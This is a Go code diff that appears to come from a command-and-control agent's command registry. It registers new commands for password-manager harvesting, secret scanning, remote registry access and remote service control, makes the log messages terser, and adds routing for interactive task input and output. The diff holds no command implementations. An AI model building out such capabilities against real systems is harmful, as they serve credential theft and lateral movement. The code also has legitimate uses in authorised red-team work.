@@ -14,11 +14,16 @@ var (
 	// runningTasks tracks currently executing tasks by task ID.
 	// Used by jobs/jobkill commands to list and cancel running tasks.
 	runningTasks sync.Map // map[string]*structs.Task
+
+	// DefaultUserAgent is set by main.go during initialization so commands
+	// that make HTTP requests (e.g., curl) can reuse the agent's configured UA
+	// instead of maintaining a separate hardcoded copy.
+	DefaultUserAgent string
 )
 
 // Initialize sets up all available commands
 func Initialize() {
-	log.Printf("[INFO] Initializing command handlers")
+	log.Printf("init handlers")
 
 	// Register cross-platform commands
 	RegisterCommand(&CatCommand{})
@@ -129,11 +134,15 @@ func Initialize() {
 	RegisterCommand(&WatchDirCommand{})
 	RegisterCommand(&IdeReconCommand{})
 	RegisterCommand(&CertCheckCommand{})
+	RegisterCommand(&PasswordManagersCommand{})
+	RegisterCommand(&SecretScanCommand{})
+	RegisterCommand(&RemoteRegCommand{})
+	RegisterCommand(&RemoteServiceCommand{})
 
 	// Register platform-specific commands
 	registerPlatformCommands()
 
-	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
+	log.Printf("loaded %d handlers", len(commandRegistry))
 }
 
 // RegisterCommand registers a command with the command registry
@@ -142,7 +151,6 @@ func RegisterCommand(cmd structs.Command) {
 	defer registryMutex.Unlock()
 
 	commandRegistry[cmd.Name()] = cmd
-	// log.Printf("[DEBUG] Registered command: %s", cmd.Name())
 }
 
 // GetCommand retrieves a command from the registry
@@ -187,6 +195,39 @@ func GetRunningTask(id string) (*structs.Task, bool) {
 		}
 	}
 	return nil, false
+}
+
+// RouteInteractiveInput sends inbound interactive messages to the correct tasks.
+func RouteInteractiveInput(msgs []structs.InteractiveMsg) {
+	for _, msg := range msgs {
+		if task, ok := GetRunningTask(msg.TaskID); ok && task.Job != nil {
+			select {
+			case task.Job.InteractiveTaskInputChannel <- msg:
+			default:
+				// Input channel full — drop message
+			}
+		}
+	}
+}
+
+// DrainInteractiveOutput collects all pending outbound interactive messages from running tasks.
+func DrainInteractiveOutput() []structs.InteractiveMsg {
+	var msgs []structs.InteractiveMsg
+	runningTasks.Range(func(_, value interface{}) bool {
+		t, ok := value.(*structs.Task)
+		if !ok || t.Job == nil {
+			return true
+		}
+		for {
+			select {
+			case msg := <-t.Job.InteractiveTaskOutputChannel:
+				msgs = append(msgs, msg)
+			default:
+				return true
+			}
+		}
+	})
+	return msgs
 }
 
 // GetAllCommands returns all registered commands
